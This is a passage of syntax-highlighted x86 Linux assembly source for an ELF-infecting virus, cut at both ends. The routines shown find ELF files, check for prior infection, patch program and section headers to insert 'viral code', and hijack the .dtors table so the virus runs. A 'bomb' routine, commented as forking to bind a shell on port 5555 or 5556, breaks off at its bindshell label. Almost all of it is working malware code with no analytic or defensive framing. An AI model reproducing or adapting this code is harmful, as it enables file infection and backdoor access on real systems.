        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_getdents</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10000</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : file fd in eax</span><span class="sc0">
</span><span class="sc1">;out : ebx == NULL if file type false or infection true</span><span class="sc0">

</span><span class="sc5">verif</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ELFMAG</span><span class="sc0">                </span><span class="sc1">;if file is not an ELF</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">verifsuite</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;eax == 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">verifsuite</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;check infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_fstat</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; is file align on 0x1000 ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notinfected</span><span class="sc0">        </span><span class="sc1">; if no file is not infected, infection FALSE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; else infection TRUE</span><span class="sc0">

</span><span class="sc5">notinfected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : pointer of file name in esp</span><span class="sc0">
</span><span class="sc1">;out : pointer of next file name in esp</span><span class="sc0">

</span><span class="sc5">nextfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; save ret adress</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; eax = offsset next name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : fd in ebx</span><span class="sc0">
</span><span class="sc1">;out : result of read in eax</span><span class="sc0">

</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_read</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; dword read in eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : fd file in ebx</span><span class="sc0">
</span><span class="sc1">;out : pointer of map file in eax</span><span class="sc0">

</span><span class="sc5">Mapping</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_mmap</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  : ecx size of mapping</span><span class="sc0">
</span><span class="sc1">;out : eax == 0 if succes</span><span class="sc0">
</span><span class="sc5">Demap</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_munmap</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">0x80</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  :</span><span class="sc0">
</span><span class="sc1">;out :</span><span class="sc0">

</span><span class="sc5">PatchSegment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc1">; ecx = number of segments</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; edx pointer to phdr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">rygo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x06</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">hi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x0c</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; patch phdr.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">ha</span><span class="sc0">

</span><span class="sc5">hi</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; test if TEXT segment.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">ho</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x0c</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x14</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; patch phdr.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ebp pointer to viral code</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">ha</span><span class="sc0">

</span><span class="sc5">ho</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; add a memory segment</span><span class="sc0">
</span><span class="sc5">ha</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; other segments ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">good</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x2a</span><span class="sc4">]</span><span class="sc1">; if yes we go patch the other</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rygo</span><span class="sc0">

</span><span class="sc5">good</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in  :</span><span class="sc0">
</span><span class="sc1">;out :</span><span class="sc0">

</span><span class="sc5">PatchSection</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">          </span><span class="sc1">; e_shoff</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x30</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; nbre de section.</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x2E</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_shentsize</span><span class="sc0">
</span><span class="sc5">patch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; sh_offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">patch</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;in  : pointer to adress of file mmaping in ebx</span><span class="sc0">
</span><span class="sc1">;out : eax == 0 if functions fail</span><span class="sc0">

</span><span class="sc5">hijackDtors</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;find the sh_offset of .shstrtab(e_shentsize*e_shstrndx+e_shoff+adresse map)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x2E</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; e_shentsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; e_shstrndx on 8bits!!!(nb_section&lt;255)</span><span class="sc0">

        </span><span class="sc6">mul</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; + e_shoff == offset shdr .shstrtab</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; + adress of file maping</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">                  </span><span class="sc1">; sh_offset of .shstrtab</span><span class="sc0">

</span><span class="sc1">;looking for .dtors in sh_name of each sections</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; offset shdr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x30</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; e_shnum</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; edi == offset .shstrtab</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


</span><span class="sc5">next_shname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x2E</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; next shdr (we don't read the first)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.dto'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">dtor_finding</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_shname</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; if don't find it</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;find the last entry in .dtors tab, and write a new entry :)</span><span class="sc0">

</span><span class="sc5">dtor_finding</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; sh_offset of .dtors</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; + map</span><span class="sc0">

</span><span class="sc5">next_dtor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; don't check the first entry (must</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; be 0xFFFFFFFF)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">next_dtor</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; offset of viral code</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;bind a shell on port 5556 if uid = 0 else bind a shell on port 5555</span><span class="sc0">

</span><span class="sc5">bomb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_fork</span><span class="sc0">   </span><span class="sc1">;fork the logical bomb</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bindshell</span><span class="sc0">       </span><span class="sc1">; the son bind the shell</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; the father exit</span><span class="sc0">

</span><span class="sc5">bindshell</span><span class="sc4">:</span><span class="sc0">
